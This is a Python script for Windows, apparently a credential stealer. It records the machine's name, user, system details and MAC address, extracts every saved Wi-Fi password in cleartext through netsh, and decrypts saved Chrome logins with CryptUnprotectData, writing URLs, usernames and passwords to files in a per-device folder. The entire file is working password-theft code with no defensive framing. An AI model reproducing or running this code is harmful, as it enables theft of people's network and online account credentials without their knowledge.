from rx7 import write,record
time=record()
import pkg_resources.py2_warn
import os,subprocess,re,platform,uuid,sys
#from pyautogui import hotkey
#hotkey('win','down')
Device_Name= platform.node()+' - '+os.getlogin()

def ADD_DEVICE():
    print('Adding Device...')
    if not os.path.exists('.\\F\\' + Device_Name):
        if not os.path.exists('.\\F'):
            os.mkdir('.\\F')
        os.mkdir('.\\F\\' + Device_Name)
    print('Done.\n')
ADD_DEVICE()

WIFIS=set(list(x[2:] for x in re.findall(r': .*', subprocess.getoutput('netsh wlan show profiles'))))

def SysINFO():
    print('Getting System Info...')
    try:
        write(f'.\\F\\{Device_Name}\\Info',mode='replace',text=f'SI:\n{platform.uname()}\nMac: {hex(uuid.getnode())}\n\nWIFI:\n{WIFIS}')
        print('Done.\n')
    except:
        print('Failed!\n')
SysINFO()

def WFPS():
    print('Getting Wifi Passwords...')
    try:
        #'''
        dic={}
        for wifi in WIFIS:
            a=subprocess.getoutput(f'netsh wlan show profiles {wifi} key=clear')
            try:
                new=re.search(r'Key Content.*',a)
                new=new.group()
                new= new[new.index(':')+2:]
                dic[wifi]=new
                sys.stdout.write(f"\rDone.  ({len(dic)})")
                #sys.stdout.flush()
            except:
                dic[wifi]='None'     
        if len(dic):
            write(f'.\\F\\{Device_Name}\\WF PS',str(dic))
            print('\n')
        else:
            print('Failed!\n')
    except:
        print('Failed!')
WFPS()

def CP():
    print("Chrome Passwords...")
    import sqlite3,win32crypt
    try:
        # <db connect and query>
        c = sqlite3.connect(os.path.join(os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Login Data'))
        cursor = c.cursor()
        try:
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        except:
            print('CP Error1')
        # <URL: credentials dictionary>
        credential = {}
        y=0
        # <decrytping the password>
        for url, user_name, pwd, in cursor.fetchall():
            try:
                # <This returns a tuple description and the password>
                pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
                credential[url] = (user_name, pwd[1])
                sys.stdout.write(f"\rDone.  ({str(len(credential))})")
            except:
                y+=1
        #print(len(credential))
        #print(y)
        # <writing to a text file (CAUTION: Don't leave this text file around!)>
        if len(credential):
            print()
            with open(f'.\\F\\{Device_Name}\\CP', 'w') as f:
                for url, credentials in credential.items():
                    if credentials[1]:
                        f.write("\n"+str(url)+"\n"+str(credentials[0].encode('utf-8'))+ " | "+str(credentials[1])+"\n")
                    #else:
                    #    f.write("\n"+url+"\n"+"USERNAME NOT FOUND | PASSWORD NOT FOUND \n")
        else:
            print('Failed!\n')
    except:
        print('Failed!\n')
CP()
print(time.lap())
input()
